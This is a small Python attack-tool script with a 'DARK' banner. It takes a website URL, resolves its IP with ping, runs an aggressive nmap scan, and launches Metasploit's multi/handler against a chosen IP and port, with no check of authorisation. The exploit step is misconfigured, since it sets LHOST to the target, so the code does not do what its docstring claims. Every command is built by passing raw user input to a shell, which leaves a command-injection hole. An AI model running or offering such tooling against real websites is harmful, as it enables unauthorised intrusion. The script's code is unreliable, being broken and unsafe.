import os
import subprocess

print ("""

██████╗░░█████╗░██████╗░██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██║░░██║███████║██████╔╝█████═╝░
██║░░██║██╔══██║██╔══██╗██╔═██╗░
██████╔╝██║░░██║██║░░██║██║░╚██╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
""") 

def get_ip_from_url(url):
    """
    Get the IP address from a given URL using the ping command.
    """
    response = subprocess.check_output(f"ping -c 1 {url}", shell=True).decode()
    ip = response.split()[2].strip('()')
    return ip

def nmap_scan(ip):
    """
    Perform an Nmap scan on a given IP address.
    """
    print(f"Scanning IP: {ip}")
    subprocess.run(f"nmap -A {ip}", shell=True)

def metasploit_exploit(ip, port):
    """
    Exploit a given IP address and port using Metasploit.
    """
    print(f"Exploiting IP: {ip} on Port: {port}")
    subprocess.run(f"msfconsole -x 'use exploit/multi/handler; set LHOST {ip}; set LPORT {port}; exploit'", shell=True)

def main():
    url = input("Enter the website URL: ")
    ip = get_ip_from_url(url)
    print(f"IP Address: {ip}")

    # Ask for user confirmation before proceeding
    confirm = input("Do you want to proceed with the Nmap scan and Metasploit exploit? (y/n): ")
    if confirm.lower() != 'y':
        print("Exiting...")
        return

    ip_input = input("Enter the IP address to scan: ")
    nmap_scan(ip_input)

    port = input("Enter the port to exploit: ")
    metasploit_exploit(ip_input, port)

if __name__ == "__main__":
    main()
